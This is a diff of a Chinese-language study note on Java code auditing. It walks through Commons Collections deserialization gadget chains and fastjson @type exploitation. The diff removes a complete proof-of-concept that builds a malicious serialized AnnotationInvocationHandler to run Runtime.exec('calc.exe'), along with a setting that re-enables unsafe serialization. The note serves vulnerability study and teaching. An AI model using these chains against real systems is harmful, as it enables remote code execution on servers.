+            User u= (User) ins.readObject();   //反序列化
+            System.out.println("反序列化成功！");
+            ins.close();
+        }
+    
+    }
+    class User implements Serializable{
+        private String name;
+        public String getName(){
+            return name;
+        }
+        public void setName(String name){
+            this.name=name;
         }
     }
     ```
-  - 代码调试：
 
-    - 跟进ChainedTransformer函数：
-
-      - ![image-20211227215534520](java代码审计.assets/image-20211227215534520.png)
-
-        ```java
-        public ChainedTransformer(Transformer[] transformers) {
-        	this.iTransformers = transformers;
-        }
-        ```
-      - 发现只是是给Transformer对象的iTransformers属性赋值，把transfomers数组复制过去。
-    - 跟进TransformedMap.decorate函数
-
-      - ![image-20211227214737073](java代码审计.assets/image-20211227214737073.png)
-
-        ```java
-            public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
-                return new TransformedMap(map, keyTransformer, valueTransformer);
-            }
-        ```
-
-        ```java
-            protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
-                super(map);
-                this.keyTransformer = keyTransformer;
-                this.valueTransformer = valueTransformer;
-            }
-        ```
-      - 发现是给TransformedMap对象的两个属性赋值，发现直接把Transformer对象复制过去了（当然这时候的transformer对象只有iTransformers属性保存着transformer数组）。
-    - 步入 `outerMap.put("test", "xxxx");`
-
-      - ![image-20211227212245755](java代码审计.assets/image-20211227212245755.png)
-      - ![image-20211227212343203](java代码审计.assets/image-20211227212343203.png)
-    - 这里有一个重要的问题，我们重新查看Map类，发现只是基本库的Map.java文件的一个接口。
-
-      - ![image-20211228104627066](java代码审计.assets/image-20211228104627066.png)
-      - 接口内只声明方法，方法由继承它的类去实现。
-      - 例如对象A继承了B接口，那就要对B负责，B内声明的所有方法，A都要去实现。
-        在这之后，B就可以接收A对象了，但如果这样做，**这时候B对象就只能调用A中实现了B接口的方法**，虽然对象B的A的其它方法还在，只不过用B接收时不能调用了。如果B再把对象还给A，A还可以调用所有方法。所以B就像一个A的指针，可以接收A，但又会对A做出限制（其实还要看代码理解的更透彻)
-      - 所以这里的put函数就进入了TransformedMap的put函数。
-    - 因为我们只给了value进行tranformerChains，所以只跟进value的函数。
-
-      ```java
-          protected Object transformValue(Object object) {
-              return this.valueTransformer == null ? object : this.valueTransformer.transform(object);
-          }
-      ```
-    - 根据之前，我们知道TransformedMap对象的两个属性保存着transformer对象，valueTransformer属性保留着ChainedTransformer类的对象。
-    - 跟进 `this.valueTransformer.transform(object)`，这个函数是一个接口，每一个transformer会自己实现，这时候是进入到了ChainedTransformer类transform函数。不难猜测，如果我们进入的不是transformer链，而是一个普通transfomer，那么它实现的transform函数就不是这样一个for循环了。
-
-      ```java
-          public Object transform(Object object) {
-              for(int i = 0; i < this.iTransformers.length; ++i) {
-      
-                  object = this.iTransformers[i].transform(object);
-      
-              }
-      
-              return object;
-          }
-      ```
-    - 遍历iTransformers，用transform方法处理object
-
-      ![image-20211227213156937](java代码审计.assets/image-20211227213156937.png)
-    - 第一个transform返回了Runtime对象，继续循环进入。
-    - ![image-20211227213414201](java代码审计.assets/image-20211227213414201.png)
-    - 第二个transform通过反射，执行了exec函数，导致命令执行。
-    - 也就前一个transform的输出会被当下一个transform的输入，这就是ChainedTransformer。
-  - ConstantTransformer是什么？
-
-    - 看下它的构造方法和transform方法
-    - ![image-20211227214037624](java代码审计.assets/image-20211227214037624.png)
-    - 相当于构造时给它传入什么对象，调用transform就能获得什么对象
-  - InvokerTransformer是什么？
-
-    - 看下它的构造方法和transform方法
-    - ![image-20211227214113393](java代码审计.assets/image-20211227214113393.png)
-    - 先看构造方法：从参数名上来看，构造函数是：函数名、函数参数类型、函数参数
-    - 再看transform方法:参数是一个对象，然后直接通过反射调用对象的函数，这个函数是调用构造方法时指定的。
-    - 这就解释得通了，在outerMap.put("test", "xxxx");时，把value值扔进transformers数组的第一个元素的transform方法，再把返回值扔给第二个元素的transform方法
-      第一个元素返回值是Runtime对象，第二个元素transform方法调用了Runtime的exec导致命令执行
-      所以，只要调用put方法，就会导致命令执行。
-    - 
-- **目前的构造还需要依赖于修改Map中的Value值或者key去触发调用反射链，我们需要想办法通过readObject()直接触发。**
-- **如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map参数是可控的，那么就有反序列化漏洞了。**于是我们找到了这个类：AnnotationInvocationHandler （jdk8及以上无法使用）。
-- **当然也有其他的攻击链。**
-
-### AnnotationInvocationHandler类
-
-- jdk8及以上无法使用
-- 实例化时传入的参数 `Objectinstance=ctor.newInstance(Target.class,outerMap);`
-- 这个类有一个成员变量 `memberValues `是Map<String,Object>类型，并且在重写的 readObject() 方法中有 `memberValues.setValue() `修改Value的操作。简直是完美！而且memberValues 可以是TransformedMap对象，也就是我们可以传入含有Transformer操作的TransformedMap对象了。可以自行查看这个类的readObject()的实现。
-
-  ```java
-  //jdk7下的代码
-  private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
-          var1.defaultReadObject();
-          AnnotationType var2 = null;
-  
-          try {
-              var2 = AnnotationType.getInstance(this.type);
-          } catch (IllegalArgumentException var9) {
-              throw new InvalidObjectException("Non-annotation type in annotation serial stream");
-          }
-  
-          Map var3 = var2.memberTypes();
-          Iterator var4 = this.memberValues.entrySet().iterator();
-  
-          while(var4.hasNext()) {
-              Entry var5 = (Entry)var4.next();
-              String var6 = (String)var5.getKey();
-              Class var7 = (Class)var3.get(var6);
-              if (var7 != null) {
-                  Object var8 = var5.getValue();
-                  if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
-
-
-                      var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
-
-
-                  }
-              }
-          }
-    
-      }
-  }
-  ```
-- 于是我们可以实例化一个AnnotationInvocationHandler类，将其成员变memberValues赋值为精心构造的恶意TransformedMap对象。然后将其序列化，提交给未做安全检查的Java应用。
-- Java应用在进行反序列化操作时，执行了readObject()函数，修改了Map的Value，则会触发TransformedMap的变换函数transform()，再通过反射链调用了Runtime.getRuntime.exec("XXX") 命令，最终就可以执行我们的任意代码了，一切是那么的天衣无缝！
-- 在 JDK 8 中，AnnotationInvocationHandler 在重写的 readObject() 方法中移除了 memberValue.setValue的调用，从而使我们上面构造的 AnnotationInvocationHandler + TransformedMap失效。当然还有其他的利用方式，具体见ysoserial.jar工具。
-- maven依赖:
-
-  ```
-  <dependency>
-      <groupId>commons-collections</groupId>
-      <artifactId>commons-collections</artifactId>
-      <version>3.2.1</version>
-  </dependency>
-  ```
-- 因为安全机制高版本（3.2.2版本及以上）`commons     org.apache.commons.collections.functors.InvokerTransformer`类无法使用
-
-  - 在java代码中使用下列命令，可以在3.22版本启动该方法
-
-    ````java
-    System.setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");`
-    ````
-- 测试代码
-
-  ```java
-  package test;
-  
-  import java.io.FileInputStream;
-  import java.io.FileOutputStream;
-  import java.io.IOException;
-  import java.io.ObjectInputStream;
-  import java.io.ObjectOutputStream;
-  import java.lang.annotation.Target;
-  import java.lang.reflect.Constructor;
-  import java.util.HashMap;
-  import java.util.Map;
-  import java.util.Map.Entry;
-  
-  import org.apache.commons.collections.Transformer;
-  import org.apache.commons.collections.functors.ChainedTransformer;
-  import org.apache.commons.collections.functors.ConstantTransformer;
-  import org.apache.commons.collections.functors.InvokerTransformer;
-  import org.apache.commons.collections.map.TransformedMap;
-  
-  public class Annotest {
-      public static void main(String[] args) throws Exception{
-          Transformer[] transformers = new Transformer[] {
-                  new ConstantTransformer(Runtime.class),
-                  new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
-                  new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
-                  new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})};
-  
-          Transformer transformedChain = new ChainedTransformer(transformers);  //实例化一个反射链
-  
-          Map innerMap = new HashMap();   //实例化一个Map对象
-          innerMap.put("value", "value");
-  
-          Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain); //将Map对象和反射链作为参数传入
-  
-          Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  //得到 AnnotationInvocationHandler类的字节码文件
-          Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
-          ctor.setAccessible(true);
-          Object instance = ctor.newInstance(Target.class, outerMap);  //得到我们构造好的 AnnotationInvocationHandler类实例
-  
-          FileOutputStream f = new FileOutputStream("./test.txt");
-          ObjectOutputStream out = new ObjectOutputStream(f);  //创建一个对象输出流
-          out.writeObject(instance);  //将我们构造的 AnnotationInvocationHandler类进行序列化
-          out.flush();
-          out.close();
-          //开始反序列化test.txt文件
-          Unser();
-      }
-  
-      public static void Unser() throws IOException,ClassNotFoundException{
-          FileInputStream in = new FileInputStream("./test.txt");   //实例化一个文件输入流
-          ObjectInputStream ins = new ObjectInputStream(in);      //实例化一个对象输入流
-          User u= (User) ins.readObject();   //反序列化
-          System.out.println("反序列化成功！");
-          ins.close();
-      }
-  };
-  
-  ```
-- jdk7下弹出了计算器。
+- 弹出了计算器。
 
   ```shell
   Exception in thread "main" java.lang.ClassCastException: sun.reflect.annotation.AnnotationInvocationHandler cannot be cast to test.User
@@ -1320,8 +1686,8 @@
           result = cloneArray(result);
     
       return result;
-  }
-  ```
+        }
+
 - 所以，只要满足方法名和参数个数限制，就会调用LazyMap的get，就会触发命令执行
 - 所以，Map接口内除了toString、hashCode、annotationType的并且参数数量为0的所有方法，都可以触发命令执行（神奇！）
 - 下一行代码 `createMemoizedInvocationHandler`，之前分析过了。使用mapProxy，创建了AnnotationInvocationHandler对象，相当于对mapProxy的封装。为什么要这么做？
@@ -1341,7 +1707,7 @@
 
   ```java
   Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
-  ```
+
 - 所以最后通过反射改掉了transfomer链的数组为真正的transformers数组。为什么这样做？
 
   - 先使用transformerChain构造利用链，之后在构造好反序列化对象后，将transformerChain中的Transformer链替换为真正的链，是**为了避免在构造利用链时触发命令执行**。
@@ -2350,14 +2716,14 @@ public class Test {
 - 对于没有 set ⽅法的 private 成员，反序列化时传递 Feature.SupportNonPublicField 即可完成赋值
 - ` User b = JSON.parseObject(jsonstr_a, Feature.SupportNonPublicField);`
 
-##### **总结**
+##### **fastJson机制总结**
 
 - `type`该关键词的特性会加载任意类，并给提供的输入字段的值进行恢复，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。
 - **这个过程会被叫做fastjson的反序列化过程，注意不要把这个过程跟java反序列化过程混为一谈。它们两个是同等级的存在，而不是前者基于后者之上。也就是说readObject()反序列化利用点那一套在这根本不适用。**相应的type加载任意类+符合条件的setter与getter变成了反序列化利用点（个人总结的三要素中的反序列化漏洞触发点）。
 
 - `parseObject(String text, Class clazz)` ，构造⽅法 + setter + 满⾜条件额外的 getter 会被调用
 - `parse(String text)` ，构造⽅法 + setter + 满⾜条件额外的 getter
-- `JSONObject parseObject(String text)` ，构造⽅法 + setter + **getter** + 满⾜条件额外 的 getter。就比上面多了getter全部调用
+- `JSONObject parseObject(String text)` ，构造⽅法 + setter + **getter** + 满⾜条件额外 的 getter。**就比上面多了getter全部调用（有些漏洞利用在get函数里面，parse()不会调用这个函数，所以就要利用JSONObject对象的 toString() 方法实现了突破）**
 
 ##### **fastjson版本探测：**
 
@@ -2484,7 +2850,7 @@ public class Test {
 
 -  fastjson反序列化时，字符串时会⾃动调⽤恶意对象的构造⽅法， setter ⽅法， getter ⽅法， 若这类⽅法中存在利⽤点，即可完成漏洞利⽤
 
-- 主要存在两种利⽤⽅式：
+- **主要存在两种利⽤⽅式：**
 
     -  JdbcRowSetImpl(JNDI) 
     - TemplatesImpl(Feature.SupportNonPublicField)，限制太大，要求原来的代码，传入了Feature.SupportNonPublicField。
@@ -2512,6 +2878,10 @@ public class Test {
         - dataSourceName ：指定 RMI / LDAP 恶意服务器，并调⽤ setDataSourceName 函数 
 
         - autoCommit ：调⽤ setAutoCommit 函数。
+
+##### fastjson不出网如何利用
+
+- https://www.cnblogs.com/R0ser1/p/15918626.html#%E5%89%8D%E8%A8%80
 
 ##### 1.2.25-1.2.41
 
